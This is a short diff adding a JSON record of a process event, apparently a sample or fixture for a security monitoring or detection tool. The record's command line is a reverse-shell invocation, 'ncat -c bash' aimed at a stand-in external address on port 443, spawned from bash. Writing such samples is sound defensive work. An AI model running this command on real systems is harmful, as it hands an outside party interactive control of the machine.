@@ -1,0 +1,12 @@
+{
+  "source": "process",
+  "process": {
+    "pid": 31337,
+    "ppid": 4100,
+    "comm": "ncat",
+    "exe": "/usr/bin/ncat",
+    "cmdline": "ncat -c bash 203.0.113.7 443",
+    "uid": 1000
+  },
+  "parent_comm": "bash"
+}
